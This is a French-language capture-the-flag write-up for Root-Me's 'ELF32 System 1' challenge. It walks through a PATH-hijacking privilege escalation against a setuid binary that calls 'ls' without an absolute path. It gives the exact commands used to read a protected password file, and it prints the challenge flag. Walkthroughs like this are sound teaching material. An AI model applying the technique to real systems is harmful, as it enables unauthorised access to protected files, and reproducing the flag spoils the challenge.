## Source et énoncé du CTF

<https://www.root-me.org/en/Challenges/App-Script/ELF32-System-1>

## Write-up

Le but de ce CTF est d'exploiter le binaire *ch11* pour lire le contenu du fichier */challenge/app-script/ch11/.passwd* contenant le flag.

Le code source en langage C du programme *ch11.c* est donné ci-dessous :

```console
    #include <stdlib.h>
    #include <sys/types.h>
    #include <unistd.h>
     
    int main(void)
    {
        setreuid(geteuid(), geteuid());
        system("ls /challenge/app-script/ch11/.passwd");
        return 0;
    }
```

On remarque une chose : 
* Le binaire utilise la commande *ls* sans utiliser son chemin absolu (faille potentielle)

Une fois compilé, le programme *ch11.c* produit le binaire *ch11*

En listant les fichiers du répertoire de travail, on obtient les droits suivants :
```console
app-script-ch11@challenge02:~$ ls -la
total 36
dr-xr-x---  2 app-script-ch11-cracked app-script-ch11 4096 Dec 10  2021 .
drwxr-xr-x 25 root                    root            4096 Sep  5  2023 ..
-r--------  1 root                    root             775 Dec 10  2021 ._perms
-rw-r-----  1 root                    root              43 Dec 10  2021 .git
-r--------  1 app-script-ch11-cracked app-script-ch11   14 Dec 10  2021 .passwd
-r--r-----  1 app-script-ch11-cracked app-script-ch11  494 Dec 10  2021 Makefile
-r-sr-x---  1 app-script-ch11-cracked app-script-ch11 7252 Dec 10  2021 ch11
-r--r-----  1 app-script-ch11-cracked app-script-ch11  187 Dec 10  2021 ch11.c
```

On remarque deux choses :
* Le fichier *.passwd* n'est accessible en lecture que par l'utilisateur *app-script-ch11-cracked*
* Le SUID Bit est positionné sur le fichier binaire *ch11*, et on se rappel que ce droit permet à tout utilisateur d'exécuter le fichier avec les droits de l'utilisateur propriétaire du fichier, c'est à dire avec les droits de *app-script-ch11-cracked*.

En exécutant le binaire *ch11*, on confirme que son contenu correspond au code source fourni :
```console
app-script-ch11@challenge02:~$ ./ch11
/challenge/app-script/ch11/.passwd
```

On en déduit que le binaire *ch11* sera le vecteur pour afficher le contenu du fichier *.passwd* puisqu'il permet à l'utilisateur *app-script-ch11* d'exécuter une commande en tant que l'utilisateur *app-script-ch11-cracked*. Le problème étant que la commande exécutée (définie dans *ch11.c*) n'est pas *cat* mais *ls*.

On doit donc trouver un moyen permettant de faire en sorte que la commande *ls* exécute le binaire */bin/cat* au lieu du binaire */bin/ls*. Pour cela, on copie le contenu du binaire */bin/cat* dans un fichier que l'on nomme *ls* et que l'on stock dans un répertoire pour lequel on a les droits en écriture (par exemple */tmp*) :
```console
app-script-ch11@challenge02:~$ cat /bin/cat > /tmp/ls
```

Ensuite, nous devons modifier le PATH de façon à ce que le système recherche le binaire *ls* prioritairement dans le répertoire */tmp* plutôt que dans le répertoire */bin*. On rappel que le système parse le PATH dans l'ordre de défintion des répertoires :
```console
app-script-ch11@challenge02:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/opt/tools/checksec/

app-script-ch11@challenge02:~$ PATH=/tmp:$PATH
app-script-ch11@challenge02:~$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/opt/tools/checksec/
```

On peut enfin exécuter le binaire *ch11* pour afficher le contenu du fichier *.passwd* et obtenir le flag :
```console
app-script-ch11@challenge02:~$ ./ch11
!oPe96a/.s8d5
```

## Flag

!oPe96a/.s8d5